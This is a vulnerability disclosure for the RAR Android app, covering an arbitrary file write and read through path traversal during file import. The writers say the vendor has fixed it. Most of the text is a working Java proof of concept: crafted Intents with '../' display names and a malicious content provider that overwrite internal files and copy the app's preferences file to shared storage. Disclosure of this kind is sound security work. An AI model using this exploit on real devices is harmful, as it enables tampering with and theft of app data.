## RAR APP Arbitrary File Write and Read Vulnerability

Vendor：RARLAB(https://www.rarlab.com/)

Affected product：RAR APP(com.rarlab.rar)

Version：<=V7.11.build127

Google Play link：https://play.google.com/store/apps/details?id=com.rarlab.rar

Vulnerability Description：The RAR app lacks proper security checks during the file import process, allowing unauthorized apps to control the file name and content and use path traversal to overwrite/read arbitrary files in the app’s internal storage, which may lead to arbitrary code execution, exposure of sensitive information, denial of service, and other security impacts.

We reported the issue to the developers, who responded positively and acknowledged our findings. The problem has now been fixed in the newly released version V7.20.build129.

poc：

```java
//Attack Intent
//For example, to write the file /data/data/com.rarlab.rar/lulu
Intent it = new Intent(Intent.ACTION_SEND);
it.setComponent(new ComponentName("com.rarlab.rar","com.rarlab.rar.MainActivity"));
it.putExtra(Intent.EXTRA_STREAM,Uri.parse("content://media.evil.contentprovider/" +
                "?_display_name=../../../../../../../../../../../../../data/data/com.rarlab.rar/lulu"));
it.setType("*/*");
startActivity(it);

//to read the file /data/data/com.rarlab.rar/shared_prefs/com.rarlab.rar_preferences.xml
Intent it = new Intent(Intent.ACTION_SEND);
it.setComponent(new ComponentName("com.rarlab.rar","com.rarlab.rar.MainActivity"));
        it.putExtra(Intent.EXTRA_STREAM,Uri.parse("content://com.rarlab.rar.provider/files/data/data/com.rarlab.rar/shared_prefs/com.rarlab.rar_preferences.xml" +
                "?displayName=../../../../../../../../../../../../../sdcard/Documents/lulu_dump_rar_file"));
it.setType("*/*");
startActivity(it);

//Evil Provider
//Authority:media.evil.contentprovider
public ParcelFileDescriptor openFile(@NonNull Uri uri, @NonNull String mode) throws FileNotFoundException {
        File file;
        file = new File(getContext().getCacheDir(), "ggg");

        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(("<b>Attack@Lu1u</b>").getBytes());
            fos.flush();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
}
public Cursor query(@NonNull Uri uri, @Nullable String[] strings, @Nullable String s, @Nullable String[] strings1, @Nullable String s1) {
        String displayName=uri.getQueryParameter("_display_name");
        MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name","_size"});
        matrixCursor.addRow(new Object[]{displayName,1000});
        return  matrixCursor;
    }
```



https://github.com/user-attachments/assets/da1348f2-ec47-4c9f-bc53-52dc13a0176c

